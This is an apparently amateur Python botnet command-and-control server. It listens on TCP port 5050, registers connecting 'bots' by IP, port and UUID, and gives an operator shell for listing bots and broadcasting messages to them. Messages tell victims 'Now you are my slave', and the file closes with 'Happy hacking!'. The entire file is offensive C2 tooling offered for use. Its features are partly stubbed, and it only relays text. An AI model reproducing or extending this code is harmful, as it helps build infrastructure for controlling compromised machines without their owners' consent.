from ctypes import addressof
import socket, uuid
import time
from typing import Type
import os, sys
from rich import print
from rich.traceback import install
from _thread import *

soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
soc.settimeout(0.1)
iis = []
addrs = []
addrsp = []
botIds = []
jon = 0
lev = 0
host = '0.0.0.0'
port = 5050
thread_c = 0
m = 0

MSG_WELCOME = ["Hello welcome to the bot network! Now you are my slave...", "You are now my slave.. work for me"]

def sendmsg(msg):
    for addr in iis:
        addr.send(bytes(f"{msg}", "utf-8"))
    print("Message has been send to all bots... ")
print("[[yellow]CC[/yellow]] Starting botnet server...")
print("[[yellow]CC[/yellow]] Installing theme module...")
install()

try:
    soc.bind((host, port))
except socket.error as e:
    print("[[red]SOC[/red]] Error when binding socket... (ERR)")
    print(f"[[red]SOC[/red]] {str(e)}")
def command(conn=None, addr=None):
    global m
    while True:
        h_C = input("cp0x$sh> ")
        try:
            if h_C[0] == None:
                command()
        except IndexError:
            print("Command is empty...")
            command()
        h_C = h_C.split()
        if h_C[0] == "help":
            print('''Commands: 
-> [purple]help[/purple] (Show this help message)
-> [yellow]ip[/yellow] (Return your ipv4 ip)
-> [purple]lbot[/purple] (Tell the server for bots information)
-> [yellow]stat[/yellow] (Status of bot leaving/joining)
-> [cyan]send[/cyan] (Send message to bots)
-> [cyan]clin[/cyan] (Debug client return)
-> [yellow]cbot[/yellow] (Tell the server for the count of connected bots)
-> [green]accep[/green] (Continue to search bot in waiting room)
-> [red]exit[/red] (Exit server)''')
        elif h_C[0] == "ip":
            print(f"Your ip: {socket.gethostbyname(socket.gethostname())}")
        elif h_C[0] == "stat":
            if len(h_C) > 1:
                if h_C[1] == "all":
                    print("[green]Status[/green]: ")
                    print(f"Leaving [yellow]bots[/yellow]: {lev}")
                    print(f"Joined [yellow]bots[/yellow]: {thread_c} ")
                    print(f"Available [yellow]bots[/yellow]: {jon}")
            else:
                print("Syntax: stat (option), Options: all, lev, jon")
        elif h_C[0] == "clin":
            if len(h_C) > 1:
                if h_C[1] == "pop":
                    if len(h_C) > 2:
                        iis.pop(int(h_C[2]))
                        addrs.pop(int(h_C[2]))
                        addrsp.pop(int(h_C[2]))
                        botIds.pop(int(h_C[2]))
                    else:
                        print("Syntax: clin (option) (index range), Options: pop")
                else:
                    print("Syntax: clin (option) (index range), Options: pop")
            else:
                print(iis)
                print("If you see something 'closed' try to remove it by using command 'clin pop (the index range)'")
        elif h_C[0] == "send":
            if len(addrs) < 1:
                print("There is not bot available...")
            else:
                if len(h_C) > 1:
                    txt = []
                    for i in range(len(h_C)):
                        if i == len(h_C)-1:
                            break
                        i += 1
                        txt.append(h_C[i])
                    text = ' '.join(map(str, txt))
                    print("Make sure you remove bots header that disconnect by using 'clin pop (index range of deat bot)'")
                    doit = input("Send or Leave? ")
                    if doit == "Leave" or doit == "Leave".lower():
                        print("Ok leaving..")
                    elif doit == "Send" or doit == "Send".lower():
                        print("Ok sending..")
                        sendmsg(str(text))
                    else:
                        print("Invalid input.. Leaving.. ")
                else:
                    print("Syntax: send (message)")
        elif h_C[0] == "lbot":
            if len(h_C) > 1:
                if h_C[1] == "show": # Show simple information
                    print("-----------------------------------------------")
                    if len(addrs) == 0:
                        print("[[green]NET[/green]] There is not [cyan]bot[/cyan] connected :(")
                    for i in range(len(addrs)): 
                        print(f'''[[cyan]BOT[/cyan]] [yellow]ID[/yellow]: [green]{botIds[i]}[/green] 
[[cyan]BOT[/cyan]] IP : [yellow]{addrs[i]}[/yellow]
[[cyan]BOT[/cyan]] PORT : [yellow]{addrsp[i]}[/yellow]
-----------------------------------------------''')
                elif h_C[1] == "find": # Show more information
                    if(len(h_C) > 2):
                        for x in range(len(botIds)):
                            if h_C[2] == botIds[x]:
                                print("Beta")
                                break
                            continue
                    else:
                        print("Syntax: lbot find (botid)")
                else:
                    print(f'''Prefix not found : {h_C[1]}

Commands for [lbot]:
-> lbot [yellow]show[/yellow],            Show simple information
-> lbot [yellow]find[/yellow] (botId),    Show more advance information                    
                    ''')
            else:
                print('''
Commands for [lbot]:
-> lbot [yellow]show[/yellow],            Show simple information
-> lbot [yellow]find[/yellow] (botId),    Show more advance information
                ''')
        elif h_C[0] == "cbot":
            print(f"[[cyan]NET[/cyan]] Bots connected: {str(jon)}")
        elif h_C[0] == "accep":
            if len(h_C) > 1:
                try:
                    if isinstance(int(h_C[1]), int):
                        print(f"[[yellow]NET[/yellow]] Continuing to search bot on delay...")
                        m += int(h_C[1])
                        break
                    else:
                        print(f"[[cyan]NET[/cyan]] Syntax: accep (option), Options: (number)")
                        break
                except TypeError:
                    print(f"[[cyan]NET[/cyan]] Syntax: accep (option), Options: (number)")
                    break
            print(f"[[yellow]NET[/yellow]] Continuing to search bot on delay...")
            break
        elif h_C[0] == "exit":
            print(f"[[yellow]NET[/yellow]] Goodbye commander :) ")
            sys.exit()
        else:
            print(f"[[yellow]SHELL[/yellow]] Command not found: [purple]{h_C[0]}[/purple]")
    if m == 0:
        recvco(None)
    elif m > 0:
        recvco(m)

def mul_client(conn):
    global jon, lev
    conn.send(str.encode("Hello welcome to the bot network! Now you are my slave..."))
    conn.send(str.encode("You do work for me now, FOREVER!"))
    while True:
        try:
            data = conn.recv(2048)
            print(data)
            reply = 'John: ' + data.decode('utf-8')
            if not data:
                break
            conn.sendall(str.encode(reply))
            #except ConnectionResetError:
            #    jon -= 1
            #    lev += 1
            #    conn.close()
        except ConnectionResetError:
            break
    jon -= 1
    lev += 1
    conn.close()

def recvco(rt=None, msg=None, stat=None):
    global m
    global jon, lev
    global thread_c
    global addr, client
    if stat == True:
        command()
    if rt == None and stat == None:
        while True:
            try:
                client, addr = soc.accept()
            except socket.timeout:
                print("[[red]BOT[/red]] Timeout, there is no bot in waiting room... Continue to shell")
                break
            botId = uuid.uuid1()
            iis.append(client)
            addrs.append(addr[0])
            addrsp.append(addr[1])
            botIds.append(botId)
            print('[[green]BOT[/green]] Bot connected : ' + addr[0] + ':' + str(addr[1]))
            start_new_thread(mul_client, (client, ))
            thread_c += 1
            jon += 1
            break
        command()
    elif isinstance(rt, int):
        for x in range(rt):
            try:
                client, addr = soc.accept()
            except socket.timeout:
                print("[[red]BOT[/red]] Timeout, there is no bot in waiting room... Continue to shell")
                break
            botId = uuid.uuid1()
            iis.append(client)
            addrs.append(addr[0])
            addrsp.append(addr[1])
            botIds.append(botId)
            print('[[green]BOT[/green]] Bot connected : ' + addr[0] + ':' + str(addr[1]))
            start_new_thread(mul_client, (client, ))
            thread_c += 1
            jon += 1
            m -= 1
            if m == 0:
                break
            continue
        command()

print("[[yellow]Shell[/yellow]] Running internal shell, help for imformation...")
print("[[cyan]SOC[/cyan]] Waiting for bot to connect...")
print("[[yellow]Shell[/yellow]] Happy hacking! :0")
soc.listen()
recvco()